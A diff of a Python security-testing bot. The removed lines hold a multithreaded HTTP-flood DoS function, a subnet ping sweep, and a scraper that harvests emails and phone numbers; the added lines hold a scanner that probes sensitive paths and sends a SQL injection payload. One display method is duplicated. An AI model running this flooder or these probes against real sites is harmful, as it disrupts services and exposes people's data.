-            # 2. Extract all CSS (inline, embedded, external)
-            self.typewriter_effect("\n🎨 Extracting CSS...")
-            css_data = self.extract_css(soup, url)
-            self.scraped_data.append({
-                'type': 'CSS',
-                'data': css_data
-            })
-            
-            # Save CSS files
-            for i, css in enumerate(css_data['external']):
-                css_path = os.path.join(self.scraped_files_dir, "css", f"external_{i}.css")
-                with open(css_path, 'w', encoding='utf-8') as f:
-                    f.write(css['content'])
-                self.typewriter_effect(f"💾 Saved CSS to: {css_path}")
-            
-            # 3. Extract all JavaScript
-            self.typewriter_effect("\n⚡ Extracting JavaScript...")
-            js_data = self.extract_javascript(soup, url)
-            self.scraped_data.append({
-                'type': 'JavaScript',
-                'data': js_data
-            })
-            
-            # Save JavaScript files
-            for i, js in enumerate(js_data['external']):
-                js_path = os.path.join(self.scraped_files_dir, "js", f"external_{i}.js")
-                with open(js_path, 'w', encoding='utf-8') as f:
-                    f.write(js['content'])
-                self.typewriter_effect(f"💾 Saved JS to: {js_path}")
-            
-            # 4. Extract all links
-            self.typewriter_effect("\n🔗 Extracting links...")
-            links = [a.get('href') for a in soup.find_all('a', href=True)]
-            self.scraped_data.append({
-                'type': 'Links',
-                'data': links[:50]  # Store first 50 links
-            })
-            
-            # 5. Extract all images
-            self.typewriter_effect("\n🖼️ Extracting images...")
-            images = [img.get('src') for img in soup.find_all('img', src=True)]
-            self.scraped_data.append({
-                'type': 'Images',
-                'data': images[:20]  # Store first 20 images
-            })
-            
-            # Download images
-            for i, img_url in enumerate(images[:10]):  # Download first 10 images
-                try:
-                    if not img_url.startswith(('http', 'https')):
-                        img_url = urljoin(url, img_url)
-                    
-                    img_response = self.session.get(img_url, stream=True, timeout=5)
-                    if img_response.status_code == 200:
-                        img_path = os.path.join(self.scraped_files_dir, "images", f"image_{i}{Path(img_url).suffix}")
-                        with open(img_path, 'wb') as f:
-                            for chunk in img_response.iter_content(1024):
-                                f.write(chunk)
-                        self.typewriter_effect(f"💾 Saved image to: {img_path}")
-                except Exception as e:
-                    continue
-            
-            # 6. Extract all forms
-            self.typewriter_effect("\n📝 Extracting forms...")
-            forms = []
-            for form in soup.find_all('form'):
-                form_data = self.extract_form_details(form)
-                forms.append(form_data)
-            self.scraped_data.append({
-                'type': 'Forms',
-                'data': forms
-            })
-            
-            # 7. Extract meta tags
-            self.typewriter_effect("\n🏷️ Extracting meta tags...")
-            metas = []
-            for meta in soup.find_all('meta'):
-                metas.append({
-                    'name': meta.get('name'),
-                    'content': meta.get('content'),
-                    'property': meta.get('property')
-                })
-            self.scraped_data.append({
-                'type': 'Meta Tags',
-                'data': metas[:20]  # Store first 20 meta tags
-            })
-            
-            # 8. Extract text content
-            self.typewriter_effect("\n📄 Extracting text content...")
-            text = ' '.join([p.get_text() for p in soup.find_all('p')])
-            self.scraped_data.append({
-                'type': 'Text Content',
-                'data': text[:1000] + '...'  # Store first 1000 chars
-            })
-            
-            # 9. Extract emails
-            self.typewriter_effect("\n✉️ Extracting emails...")
-            emails = re.findall(r'[\w\.-]+@[\w\.-]+', response.text)
-            if emails:
-                self.scraped_data.append({
-                    'type': 'Emails',
-                    'data': list(set(emails))  # Remove duplicates
-                })
-            
-            # 10. Extract phone numbers
-            self.typewriter_effect("\n📞 Extracting phone numbers...")
-            phone_numbers = re.findall(r'(\+?\d[\d\s\-\(\)]{7,}\d)', response.text)
-            if phone_numbers:
-                self.scraped_data.append({
-                    'type': 'Phone Numbers',
-                    'data': list(set(phone_numbers))  # Remove duplicates
-                })
-            
-            self.typewriter_effect("\n✅ Enhanced web scraping completed!")
-            self.typewriter_effect(f"📁 All scraped files saved to: {self.scraped_files_dir}")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Web scraping failed: {str(e)}")
-    
-    def download_scraped_files(self):
-        """Download all scraped files as a zip archive"""
-        if not self.scraped_files_dir or not os.path.exists(self.scraped_files_dir):
-            self.typewriter_effect("❌ No scraped files available. Run /scrape first.")
-            return
-        
-        try:
-            # Create zip file name
-            domain = os.path.basename(self.scraped_files_dir).replace("scraped_", "")
-            zip_filename = f"scraped_{domain}_{int(time.time())}.zip"
-            
-            # Create zip archive
-            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', self.scraped_files_dir)
-            
-            self.typewriter_effect(f"\n📦 Successfully created zip archive: {zip_filename}")
-            self.typewriter_effect(f"💾 Path: {os.path.join(os.getcwd(), zip_filename)}")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ Failed to create zip archive: {str(e)}")
-    
-    def extract_html_structure(self, soup):
-        """Extract HTML structure with important elements"""
-        html_data = {
-            'doctype': '',
-            'html_tag': {},
-            'head_elements': [],
-            'body_structure': []
-        }
-        
-        # Get DOCTYPE
-        if soup.original_encoding:
-            html_data['doctype'] = f"<!DOCTYPE {soup.original_encoding}>"
-        
-        # Get HTML tag attributes
-        if soup.html:
-            html_data['html_tag'] = dict(soup.html.attrs)
-        
-        # Get HEAD elements
-        if soup.head:
-            for child in soup.head.children:
-                if child.name:
-                    element = {
-                        'tag': child.name,
-                        'attributes': dict(child.attrs)
-                    }
-                    if child.name == 'title' and child.string:
-                        element['content'] = child.string.strip()
-                    html_data['head_elements'].append(element)
-        
-        # Get BODY structure (first 3 levels)
-        if soup.body:
-            html_data['body_structure'] = self.extract_body_structure(soup.body)
-        
-        return html_data
-
-    def extract_body_structure(self, element, level=0, max_level=3):
-        """Recursively extract body structure"""
-        if level > max_level:
-            return []
-        
-        structure = []
-        for child in element.children:
-            if child.name:
-                node = {
-                    'tag': child.name,
-                    'attributes': dict(child.attrs),
-                    'children': self.extract_body_structure(child, level+1, max_level)
-                }
-                structure.append(node)
-        
-        return structure
-
-    def extract_css(self, soup, base_url):
-        """Extract all CSS (inline, embedded, external)"""
-        css_data = {
-            'inline': [],
-            'embedded': [],
-            'external': []
-        }
-        
-        # 1. Extract inline CSS
-        for tag in soup.find_all(style=True):
-            css_data['inline'].append({
-                'tag': tag.name,
-                'styles': tag['style']
-            })
-        
-        # 2. Extract embedded CSS
-        for style in soup.find_all('style'):
-            if style.string:
-                css_data['embedded'].append(style.string.strip())
-        
-        # 3. Extract external CSS
-        for link in soup.find_all('link', rel='stylesheet'):
-            href = link.get('href')
-            if href:
-                css_url = urljoin(base_url, href)
-                try:
-                    css_response = self.session.get(css_url, timeout=5)
-                    if css_response.status_code == 200:
-                        css_data['external'].append({
-                            'url': css_url,
-                            'content': css_response.text
-                        })
-                except:
-                    pass
-        
-        return css_data
-
-    def extract_javascript(self, soup, base_url):
-        """Extract all JavaScript (inline, external)"""
-        js_data = {
-            'inline': [],
-            'external': []
-        }
-        
-        # 1. Extract inline JS
-        for script in soup.find_all('script'):
-            if script.string and not script.get('src'):
-                js_data['inline'].append(script.string.strip())
-        
-        # 2. Extract external JS
-        for script in soup.find_all('script', src=True):
-            src = script.get('src')
-            if src:
-                js_url = urljoin(base_url, src)
-                try:
-                    js_response = self.session.get(js_url, timeout=5)
-                    if js_response.status_code == 200:
-                        js_data['external'].append({
-                            'url': js_url,
-                            'content': js_response.text
-                        })
-                except:
-                    pass
-        
-        return js_data
-
-    def extract_form_details(self, form):
-        """Extract detailed form information"""
-        form_data = {
-            'action': form.get('action'),
-            'method': form.get('method', 'GET'),
-            'inputs': [],
-            'buttons': [],
-            'attributes': dict(form.attrs)
-        }
-        
-        # Extract input fields
-        for input_tag in form.find_all('input'):
-            form_data['inputs'].append({
-                'name': input_tag.get('name'),
-                'type': input_tag.get('type', 'text'),
-                'value': input_tag.get('value'),
-                'attributes': {k: v for k, v in input_tag.attrs.items() 
-                              if k not in ['name', 'type', 'value']}
-            })
-        
-        # Extract textareas
-        for textarea in form.find_all('textarea'):
-            form_data['inputs'].append({
-                'name': textarea.get('name'),
-                'type': 'textarea',
-                'value': textarea.string if textarea.string else '',
-                'attributes': {k: v for k, v in textarea.attrs.items() 
-                               if k != 'name'}
-            })
-        
-        # Extract select options
-        for select in form.find_all('select'):
-            options = []
-            for option in select.find_all('option'):
-                options.append({
-                    'value': option.get('value'),
-                    'text': option.string if option.string else ''
-                })
-            
-            form_data['inputs'].append({
-                'name': select.get('name'),
-                'type': 'select',
-                'options': options,
-                'attributes': {k: v for k, v in select.attrs.items() 
-                              if k != 'name'}
-            })
-        
-        # Extract buttons
-        for button in form.find_all('button'):
-            form_data['buttons'].append({
-                'name': button.get('name'),
-                'type': button.get('type', 'button'),
-                'text': button.string if button.string else '',
-                'attributes': {k: v for k, v in button.attrs.items() 
-                              if k not in ['name', 'type']}
-            })
-        
-        return form_data
-
-    def show_scraped_data(self):
-        """Enhanced display of scraped data with code preview"""
-        if not self.scraped_data:
-            self.typewriter_effect("\n📭 No scraped data available yet!")
-            return
-        
-        self.typewriter_effect("\n📋 ENHANCED SCRAPED DATA REPORT:")
-        self.typewriter_effect("══════════════════════════════════════════════")
-        
-        for item in self.scraped_data:
-            self.typewriter_effect(f"\n🔍 {item['type']}:")
-            self.typewriter_effect("──────────────────────────────────────────")
-            
-            if item['type'] == 'HTML Structure':
-                self.display_html_structure(item['data'])
-            elif item['type'] == 'CSS':
-                self.display_code_data('CSS', item['data'])
-            elif item['type'] == 'JavaScript':
-                self.display_code_data('JavaScript', item['data'])
-            elif item['type'] == 'Text Content':
-                self.typewriter_effect(f"   {item['data']}")
-            elif isinstance(item['data'], list):
-                self.display_list_data(item['type'], item['data'])
-            
-            self.typewriter_effect("──────────────────────────────────────────")
-        
-        self.typewriter_effect(f"\n📋 Total data categories scraped: {len(self.scraped_data)}")
-        if self.scraped_files_dir:
-            self.typewriter_effect(f"📁 Scraped files directory: {self.scraped_files_dir}")
-
-    def display_html_structure(self, html_data):
-        """Display HTML structure in readable format"""
-        self.typewriter_effect(f"   DOCTYPE: {html_data.get('doctype', 'Not specified')}")
-        
-        self.typewriter_effect("\n   HTML Tag Attributes:")
-        for attr, value in html_data.get('html_tag', {}).items():
-            self.typewriter_effect(f"      {attr}: {value}")
-        
-        self.typewriter_effect("\n   HEAD Elements:")
-        for element in html_data.get('head_elements', [])[:5]:  # Show first 5
-            self.typewriter_effect(f"      <{element['tag']}>")
-            for attr, value in element.get('attributes', {}).items():
-                self.typewriter_effect(f"         {attr}: {value}")
-            if 'content' in element:
-                self.typewriter_effect(f"         Content: {element['content']}")
-        
-        self.typewriter_effect("\n   BODY Structure (simplified):")
-        self.display_html_nodes(html_data.get('body_structure', []), depth=1)
-
-    def display_html_nodes(self, nodes, depth=0, max_depth=2):
-        """Recursively display HTML nodes"""
-        if depth > max_depth:
-            return
-        
-        for node in nodes[:3]:  # Show first 3 nodes at each level
-            indent = '   ' * (depth + 1)
-            self.typewriter_effect(f"{indent}<{node['tag']}>")
-            
-            # Display attributes if any
-            for attr, value in node.get('attributes', {}).items():
-                self.typewriter_effect(f"{indent}   {attr}: {value}")
-            
-            # Recursively display children
-            if node.get('children'):
-                self.display_html_nodes(node['children'], depth+1, max_depth)
-
-    def display_code_data(self, code_type, code_data):
-        """Display CSS or JavaScript code data"""
-        if code_type == 'CSS':
-            self.typewriter_effect("   Inline Styles:")
-            for style in code_data.get('inline', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      <{style['tag']}>: {style['styles'][:100]}...")
-            
-            self.typewriter_effect("\n   Embedded CSS:")
-            for css in code_data.get('embedded', [])[:1]:  # Show first 1
-                self.typewriter_effect(f"      {css[:200]}...")
-            
-            self.typewriter_effect("\n   External CSS Files:")
-            for css in code_data.get('external', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      URL: {css['url']}")
-                self.typewriter_effect(f"      Content Sample: {css['content'][:200]}...")
-        
-        elif code_type == 'JavaScript':
-            self.typewriter_effect("   Inline JavaScript:")
-            for js in code_data.get('inline', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      {js[:200]}...")
-            
-            self.typewriter_effect("\n   External JavaScript Files:")
-            for js in code_data.get('external', [])[:2]:  # Show first 2
-                self.typewriter_effect(f"      URL: {js['url']}")
-                self.typewriter_effect(f"      Content Sample: {js['content'][:200]}...")
-
-    def display_list_data(self, data_type, data_list):
-        """Display list-type data (links, images, etc.)"""
-        if data_type == 'Forms':
-            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
-                self.typewriter_effect(f"   Form {i}:")
-                self.typewriter_effect(f"      Action: {form.get('action')}")
-                self.typewriter_effect(f"      Method: {form.get('method')}")
-                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
-                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
-        else:
-            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
-                if isinstance(item, str):
-                    self.typewriter_effect(f"   {i}. {item}")
-                elif isinstance(item, dict):
-                    if data_type == 'Meta Tags':
-                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
-                        self.typewriter_effect(f"      Content: {item.get('content')}")
-                        self.typewriter_effect(f"      Property: {item.get('property')}")
-        
-        if len(data_list) > 5:
-            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")
-    def display_list_data(self, data_type, data_list):
-        """Display list-type data (links, images, etc.)"""
-        if data_type == 'Forms':
-            for i, form in enumerate(data_list[:2], 1):  # Show first 2 forms
-                self.typewriter_effect(f"   Form {i}:")
-                self.typewriter_effect(f"      Action: {form.get('action')}")
-                self.typewriter_effect(f"      Method: {form.get('method')}")
-                self.typewriter_effect(f"      Inputs: {len(form.get('inputs', []))}")
-                self.typewriter_effect(f"      Buttons: {len(form.get('buttons', []))}")
-        else:
-            for i, item in enumerate(data_list[:5], 1):  # Show first 5 items
-                if isinstance(item, str):
-                    self.typewriter_effect(f"   {i}. {item}")
-                elif isinstance(item, dict):
-                    if data_type == 'Meta Tags':
-                        self.typewriter_effect(f"   {i}. Name: {item.get('name')}")
-                        self.typewriter_effect(f"      Content: {item.get('content')}")
-                        self.typewriter_effect(f"      Property: {item.get('property')}")
-        
-        if len(data_list) > 5:
-            self.typewriter_effect(f"   ... and {len(data_list)-5} more items")
-
-    def show_reports(self):
-        """Show vulnerability reports"""
-        if not self.vulnerabilities:
-            self.typewriter_effect("\n✅ No vulnerabilities found yet!")
-            return
-        
-        self.typewriter_effect("\n📊 VULNERABILITY REPORT:")
-        self.typewriter_effect("──────────────────────────────────────────────")
-        
-        for i, vuln in enumerate(self.vulnerabilities, 1):
-            self.typewriter_effect(f"\n🔍 Finding #{i}: {vuln['type']}")
-            self.typewriter_effect(f"   Severity: {vuln['severity']}")
-            self.typewriter_effect(f"   Description: {vuln['description']}")
-            
-            if 'url' in vuln:
-                self.typewriter_effect(f"   URL: {vuln['url']}")
-            if 'host' in vuln:
-                self.typewriter_effect(f"   Host: {vuln['host']}")
-            if 'parameter' in vuln:
-                self.typewriter_effect(f"   Parameter: {vuln['parameter']}")
-            if 'payload' in vuln:
-                self.typewriter_effect(f"   Payload: {vuln['payload']}")
-            if 'username' in vuln and 'password' in vuln:
-                self.typewriter_effect(f"   Credentials: {vuln['username']}:{vuln['password']}")
-            
-            self.typewriter_effect("──────────────────────────────────────────────")
-        self.typewriter_effect(f"\n📋 Total vulnerabilities found: {len(self.vulnerabilities)}")
-
-    def host_discover(self, base_ip):
-        self.typewriter_effect(f"🔍 Discovering hosts on subnet {base_ip}.0/24 ...")
-        active_hosts = []
-        for i in range(1, 255):
-            ip = f"{base_ip}.{i}"
-            if platform.system().lower() == "windows":
-                ping_cmd = f"ping -n 1 -w 300 {ip} > nul"
-            else:
-                ping_cmd = f"ping -c 1 -W 1 {ip} > /dev/null"
-            response = os.system(ping_cmd)
-            if response == 0:
-                try:
-                    hostname = socket.gethostbyaddr(ip)[0]
-                except:
-                    hostname = "Unknown"
-                active_hosts.append((ip, hostname))
-                print(f"✅ {ip}  ({hostname})")
-
-        if not active_hosts:
-            self.typewriter_effect("❌ No active hosts found.")
-        else:
-            self.typewriter_effect(f"✅ Total active hosts: {len(active_hosts)}")
-
-    def dos_attack(self, target_url):
-        """Customizable DoS attack for testing your own website's defenses"""
-        self.typewriter_effect(f"💥 Preparing DoS attack on {target_url}")
-        
-        try:
-            # Input validation
-            while True:
-                try:
-                    requests_count = input("Enter number of requests (Default 1000 Max 10000): ").strip()
-                    if not requests_count:
-                        requests_count = 1000
-                    else:
-                        requests_count = int(requests_count)
-                        if requests_count > 10000:
-                            self.typewriter_effect("⚠️ Maximum is 10000, using 10000")
-                            requests_count = 10000
-                    break
-                except ValueError:
-                    self.typewriter_effect("❌ Please enter a valid number")
-            
-            while True:
-                try:
-                    thread_count = input("Enter number of threads (Default 10 Max 100): ").strip()
-                    if not thread_count:
-                        thread_count = 10
-                    else:
-                        thread_count = int(thread_count)
-                        if thread_count > 100:
-                            self.typewriter_effect("⚠️ Maximum is 100, using 100")
-                            thread_count = 100
-                    break
-                except ValueError:
-                    self.typewriter_effect("❌ Please enter a valid number")
-            
-            while True:
-                try:
-                    delay = input("Enter delay between requests in seconds (Default 0.1): ").strip()
-                    if not delay:
-                        delay = 0.1
-                    else:
-                        delay = float(delay)
-                    break
-                except ValueError:
-                    self.typewriter_effect("❌ Please enter a valid number")
-            
-            # Confirmation
-            self.typewriter_effect(f"\n⚡ Attack Configuration:")
-            self.typewriter_effect(f"   Target: {target_url}")
-            self.typewriter_effect(f"   Total Requests: {requests_count}")
-            self.typewriter_effect(f"   Threads: {thread_count}")
-            self.typewriter_effect(f"   Delay: {delay} seconds")
-            
-            confirm = input("\nAre you sure you want to launch this attack? (yes/no): ").lower()
-            if confirm != 'yes':
-                self.typewriter_effect("🛑 Attack cancelled")
-                return
-            
-            # Attack statistics
-            successful_requests = 0
-            failed_requests = 0
-            start_time = time.time()
-            
-            # Worker function
-            def attack_worker(url, req_count, delay_time):
-                nonlocal successful_requests, failed_requests
-                for _ in range(req_count):
-                    try:
-                        response = requests.get(url, timeout=5)
-                        if response.status_code == 200:
-                            successful_requests += 1
-                        else:
-                            failed_requests += 1
-                    except:
-                        failed_requests += 1
-                    time.sleep(delay_time)
-            
-            # Calculate requests per thread
-            requests_per_thread = requests_count // thread_count
-            remaining_requests = requests_count % thread_count
-            
-            # Start threads
-            self.typewriter_effect("\n🚀 Launching DoS attack... Press Ctrl+C to stop")
-            threads = []
-            
-            for i in range(thread_count):
-                # Distribute remaining requests to first few threads
-                req_count = requests_per_thread + (1 if i < remaining_requests else 0)
-                if req_count > 0:
-                    t = threading.Thread(target=attack_worker, args=(target_url, req_count, delay))
-                    t.daemon = True
-                    t.start()
-                    threads.append(t)
-            
-            # Progress monitoring
-            try:
-                while any(t.is_alive() for t in threads):
-                    elapsed = time.time() - start_time
-                    reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
-                    
-                    sys.stdout.write(f"\r⚡ Status: {successful_requests + failed_requests}/{requests_count} requests | "
-                                   f"Success: {successful_requests}✅| "
-                                   f"Failed: {failed_requests} | "
-                                   f"Rate: {reqs_per_sec:.1f} reqs/sec")
-                    sys.stdout.flush()
-                    time.sleep(0.5)
-            except KeyboardInterrupt:
-                self.typewriter_effect("\n🛑 Attack interrupted by user")
-            
-            # Final statistics
-            elapsed = time.time() - start_time
-            reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
-            
-            self.typewriter_effect("\n\n📊 Attack Results:")
-            self.typewriter_effect(f"   Total Requests: {successful_requests + failed_requests}")
-            self.typewriter_effect(f"   Successful: {successful_requests}")
-            self.typewriter_effect(f"   Failed: {failed_requests}")
-            self.typewriter_effect(f"   Duration: {elapsed:.2f} seconds")
-            self.typewriter_effect(f"   Request Rate: {reqs_per_sec:.1f} requests/second")
-            
-        except Exception as e:
-            self.typewriter_effect(f"❌ DoS attack failed: {str(e)}")
-
     def get_web_info(self, url):
         """Get comprehensive information about a website"""
         self.typewriter_effect(f"🌐 Gathering website information for: {url}")
@@ -3569,7 +910,7 @@ REPORTING:
         except Exception as e:
             self.typewriter_effect(f"❌ Website info gathering failed: {str(e)}")
             return None
-
+    
     def display_web_info(self, info):
         """Display the website information in a formatted way"""
         if not info:
@@ -3634,165 +975,731 @@ REPORTING:
             self.typewriter_effect("\n⚠️ No security headers found")
         
         self.typewriter_effect("\n✅ Website information gathering complete")
-
-    def process_command(self, command):
-        """Process user commands"""
-        command = command.strip()
-        
-        if command.startswith('/scan:'):
-            url = command[6:].strip()
-            if url:
-                self.comprehensive_scan(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /scan:https://example.com")
-        
-        elif command.startswith('/bruteforce:'):
-            url = command[12:].strip()
-            if url:
-                self.bruteforce_login(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /bruteforce:https://site.com/login")
-        
-        elif command.startswith('/sqltest:'):
-            url = command[9:].strip()
-            if url:
-                self.sql_injection_test(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /sqltest:https://site.com/page.php?id=1")
-        
-        elif command.startswith('/xsstest:'):
-            url = command[9:].strip()
-            if url:
-                self.xss_test(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /xsstest:https://site.com/search.php")
-        
-        elif command.startswith('/portscan:'):
-            host = command[10:].strip()
-            if host:
-                self.port_scan(host)
-            else:
-                self.typewriter_effect("❌ Please provide a host. Example: /portscan:192.168.1.1")
-        
-        elif command.startswith('/sslcheck:'):
-            host = command[10:].strip()
-            if host:
-                self.ssl_check(host)
-            else:
-                self.typewriter_effect("❌ Please provide a host. Example: /sslcheck:example.com")
-        
-        elif command.startswith('/scrape:'):
-            url = command[8:].strip()
-            if url:
-                self.scrape_website(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /scrape:https://example.com")
-        
-        elif command == '/downldscrap':
-            self.download_scraped_files()
-        
-        elif command == '/help':
-            self.show_help()
-        
-        elif command == '/report':
-            self.show_reports()
-        
-        elif command == '/scraped':
-            self.show_scraped_data()
-        
-        elif command == '/exit':
-            self.typewriter_effect("👋 Trevor Bot v2.6 shutting down...")
-            self.typewriter_effect("🔒 All security data saved. Stay secure!")
-            return False
-        
-        elif command.startswith("/hostdiscover:"):
-            try:
-                subnet = command.split(":")[1]
-                self.host_discover(subnet)
-            except IndexError:
-                self.typewriter_effect("❌ Usage: /hostdiscover:192.168.1")
-
-        elif command.startswith("/dos:"):
-            url = command[5:].strip()
-            if url:
-                if not url.startswith(('http://', 'https://')):
-                    url = 'http://' + url
-                self.dos_attack(url)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /dos:https://example.com")
-
-        elif command.startswith('/webinfo:'):
-            url = command[9:].strip()
-            if url:
-                info = self.get_web_info(url)
-                if info:
-                    self.display_web_info(info)
-            else:
-                self.typewriter_effect("❌ Please provide a URL. Example: /webinfo:https://example.com")
-                
-        else:
-            self.typewriter_effect("❓ Unknown command. Type /help for available commands.")
-        
-        return True
     
-    def run(self):
-        """Main bot loop"""
-        self.show_banner()
-        self.typewriter_effect("Type /help for available security testing commands")
-        self.typewriter_effect("⚠️  Remember: Only test systems you own or have explicit permission!")
+    def scan_website(self, url):
+        """Perform comprehensive security scan on a website"""
+        self.typewriter_effect(f"\n🔍 Starting security scan for: {url}")
         
-        while True:
+        # Get basic website info first
+        info = self.get_web_info(url)
+        if not info:
+            return None
+            
+        # Create scan results dictionary
+        scan_results = {
+            'url': url,
+            'domain': info['domain'],
+            'ip_address': info['ip_address'],
+            'security_score': 0,
+            'vulnerabilities': [],
+            'security_issues': [],
+            'recommendations': [],
+            'open_ports': [],
+            'ssl_info': {},
+            'directory_listing': [],
+            'exposed_files': [],
+            'common_vulnerabilities': []
+        }
+        
+        # Check SSL/TLS if HTTPS
+        if info['is_secure']:
+            self.loading_animation("Analyzing SSL/TLS configuration")
             try:
-                print()
-                command = input("Trevor Security Bot> ").strip()
-                
-                if not command:
-                    continue
-                
-                if not self.process_command(command):
-                    break
-                    
-            except KeyboardInterrupt:
-                self.typewriter_effect("\n🛑 Trevor Bot interrupted by user")
-                break
+                hostname = info['domain']
+                context = ssl.create_default_context()
+                with socket.create_connection((hostname, 443), timeout=10) as sock:
+                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
+                        cert = ssock.getpeercert()
+                        cipher = ssock.cipher()
+                        version = ssock.version()
+                        
+                        scan_results['ssl_info'] = {
+                            'certificate': {
+                                'subject': dict(x[0] for x in cert['subject']),
+                                'issuer': dict(x[0] for x in cert['issuer']),
+                                'version': cert['version'],
+                                'serial_number': cert['serialNumber'],
+                                'not_before': cert['notBefore'],
+                                'not_after': cert['notAfter'],
+                            },
+                            'connection': {
+                                'protocol': version,
+                                'cipher': cipher[0],
+                                'bits': cipher[2],
+                            }
+                        }
+                        
+                        # Check certificate expiration
+                        from datetime import datetime
+                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
+                        days_left = (not_after - datetime.now()).days
+                        
+                        if days_left < 0:
+                            scan_results['security_issues'].append("SSL certificate has expired")
+                            scan_results['vulnerabilities'].append({
+                                'type': 'SSL Certificate Expired',
+                                'severity': 'High',
+                                'description': 'The SSL certificate has expired'
+                            })
+                        elif days_left < 30:
+                            scan_results['security_issues'].append(f"SSL certificate expires in {days_left} days")
+                            scan_results['vulnerabilities'].append({
+                                'type': 'SSL Certificate Expiring Soon',
+                                'severity': 'Medium',
+                                'description': f'The SSL certificate expires in {days_left} days'
+                            })
+                        
+                        # Check protocol version
+                        if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
+                            scan_results['security_issues'].append(f"Using outdated protocol: {version}")
+                            scan_results['vulnerabilities'].append({
+                                'type': 'Outdated TLS Protocol',
+                                'severity': 'High',
+                                'description': f'Using outdated TLS protocol: {version}'
+                            })
+                        
+                        # Check cipher strength
+                        if cipher[2] < 128:
+                            scan_results['security_issues'].append(f"Weak cipher: {cipher[0]} ({cipher[2]} bits)")
+                            scan_results['vulnerabilities'].append({
+                                'type': 'Weak Cipher',
+                                'severity': 'Medium',
+                                'description': f'Using weak cipher: {cipher[0]} ({cipher[2]} bits)'
+                            })
             except Exception as e:
-                self.typewriter_effect(f"❌ Unexpected error: {str(e)}")
+                scan_results['security_issues'].append(f"SSL/TLS analysis failed: {str(e)}")
+        
+        # Check for common directories and files
+        self.loading_animation("Checking for exposed directories and files")
+        common_paths = [
+            '/.env', '/.git', '/.svn', '/.htaccess', '/.htpasswd',
+            '/backup', '/backups', '/admin', '/administrator', '/login',
+            '/wp-admin', '/wp-config.php', '/config.php', '/phpinfo.php',
+            '/test.php', '/info.php', '/robots.txt', '/sitemap.xml',
+            '/crossdomain.xml', '/clientaccesspolicy.xml'
+        ]
+        
+        for path in common_paths:
+            try:
+                test_url = urljoin(url, path)
+                response = self.session.head(test_url, timeout=5)
+                
+                if response.status_code == 200:
+                    if path.endswith('/'):
+                        scan_results['directory_listing'].append(test_url)
+                    else:
+                        scan_results['exposed_files'].append(test_url)
+                        
+                    scan_results['security_issues'].append(f"Exposed path: {path}")
+                    scan_results['vulnerabilities'].append({
+                        'type': 'Exposed Path',
+                        'severity': 'Medium',
+                        'description': f'Potentially sensitive file or directory exposed: {path}'
+                    })
+            except:
+                continue
+        
+        # Check for common vulnerabilities
+        self.loading_animation("Checking for common vulnerabilities")
+        
+        # Check for Clickjacking protection
+        if 'X-Frame-Options' not in info['headers'] and 'Content-Security-Policy' not in info['headers']:
+            scan_results['security_issues'].append("Missing Clickjacking protection")
+            scan_results['vulnerabilities'].append({
+                'type': 'Missing Clickjacking Protection',
+                'severity': 'Medium',
+                'description': 'Missing X-Frame-Options or Content-Security-Policy headers'
+            })
+        
+        # Check for XSS protection
+        if 'X-XSS-Protection' not in info['headers']:
+            scan_results['security_issues'].append("Missing XSS protection header")
+            scan_results['vulnerabilities'].append({
+                'type': 'Missing XSS Protection',
+                'severity': 'Medium',
+                'description': 'Missing X-XSS-Protection header'
+            })
+        
+        # Check for MIME type sniffing
+        if 'X-Content-Type-Options' not in info['headers']:
+            scan_results['security_issues'].append("Missing X-Content-Type-Options header")
+            scan_results['vulnerabilities'].append({
+                'type': 'Missing MIME Type Sniffing Protection',
+                'severity': 'Low',
+                'description': 'Missing X-Content-Type-Options header'
+            })
+        
+        # Check for HSTS
+        if info['is_secure'] and 'Strict-Transport-Security' not in info['headers']:
+            scan_results['security_issues'].append("Missing HSTS header")
+            scan_results['vulnerabilities'].append({
+                'type': 'Missing HSTS',
+                'severity': 'Medium',
+                'description': 'Missing Strict-Transport-Security header for HTTPS site'
+            })
+        
+        # Check for server version disclosure
+        if 'Server' in info['headers']:
+            server = info['headers']['Server']
+            if any(char.isdigit() for char in server):
+                scan_results['security_issues'].append("Server version disclosed")
+                scan_results['vulnerabilities'].append({
+                    'type': 'Server Version Disclosure',
+                    'severity': 'Low',
+                    'description': f'Server header reveals version: {server}'
+                })
+        
+        # Check for PHP version disclosure
+        if 'X-Powered-By' in info['headers']:
+            powered_by = info['headers']['X-Powered-By']
+            if 'PHP' in powered_by and any(char.isdigit() for char in powered_by):
+                scan_results['security_issues'].append("PHP version disclosed")
+                scan_results['vulnerabilities'].append({
+                    'type': 'PHP Version Disclosure',
+                    'severity': 'Low',
+                    'description': f'X-Powered-By header reveals PHP version: {powered_by}'
+                })
+        
+        # Check for common web vulnerabilities
+        self.loading_animation("Testing for common web vulnerabilities")
+        
+        # Test for SQL Injection (basic test)
+        try:
+            test_url = urljoin(url, "?id=1' OR '1'='1")
+            response = self.session.get(test_url, timeout=5)
+            
+            # Check for common SQL error messages
+            sql_errors = [
+                "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB Provider",
+                "SQLServer", "PostgreSQL query failed", "SQLite error"
+            ]
+            
+            for error in sql_errors:
+                if error in response.text:
+                    scan_results['security_issues'].append("Potential SQL Injection vulnerability")
+                    scan_results['vulnerabilities'].append({
